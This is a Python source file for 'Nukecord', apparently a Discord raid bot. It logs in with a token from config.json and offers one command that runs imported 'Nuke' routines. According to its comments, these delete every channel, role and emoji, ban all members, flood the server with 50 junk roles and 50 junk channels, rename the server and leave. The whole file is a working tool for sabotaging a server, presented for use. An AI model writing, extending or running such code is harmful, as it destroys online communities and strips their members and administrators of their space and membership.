import colorama
import discord
from meth import Nuke, setup
from discord.ext import commands
import json
import asyncio
import time
from colorama import Fore
colorama.init()

bot = commands.Bot(command_prefix=';', intents=discord.Intents.all())
bot.remove_command('help')


@bot.command()
async def fuck(ctx):
    print(f"{Fore.LIGHTGREEN_EX}Nuking {ctx.guild.name}")
    time.sleep(1)
    tasks = [
        Nuke.roles(ctx),  # deletes all roles below the bot
        Nuke.emojis(ctx),  # deletes all emojis
        Nuke.createroles(ctx),  # creates 50 roles with name in config.json
        Nuke.editserver(ctx),  # changes server icon and name
        # creates 50 channels with name in config.json
        Nuke.createchannels(ctx),
    ]
    # deletes all channels so admins can't do anything
    await Nuke.channels(ctx)
    await Nuke.massban(ctx)  # bans everyone
    await asyncio.gather(*tasks)  # asynchronous tasks
    await Nuke.leave(ctx)  # leaves the server after destroying it


@bot.event
async def on_ready():
    time.sleep(1)
    print('Nukecord online. Type ;fuck in the server...\n')
    time.sleep(1)
    print('Servers connected to:')
    for guild in bot.guilds:
        print(guild.name + " - " + str(guild.id))

print(f"""
  
{Fore.RED}███╗   ██╗██╗   ██╗██╗  ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
{Fore.LIGHTRED_EX}████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
{Fore.LIGHTYELLOW_EX}█A╔██╗ ██║█u║   ██║█x███╔╝ █y███╗  █l║     █o║   ██║█t████╔╝█l║  ██║
{Fore.LIGHTGREEN_EX}██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██║     ██║   ██║██╔══██╗██║  ██║
{Fore.BLUE}██║ ╚████║╚██#███╔╝██║  █1╗███0███╗╚███0██╗╚███1██╔╝██║  ██║██████╔╝
{Fore.MAGENTA}╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ {Fore.RESET}
https://github.com/auxylotl

""")
setup()
with open("config.json") as f:
    config = json.load(f)
    f.close()
    token = config.get("token")
token = config.get("token")
if token == "token" or token == "":
    time.sleep(1)
    print(f"{Fore.RED}Enter a token in config.json.....")
    time.sleep(3)
    exit()
else:
    try:
        bot.run(token)
    except:
        print(f"{Fore.RED}Invalid token!")
        time.sleep(3)
        exit()
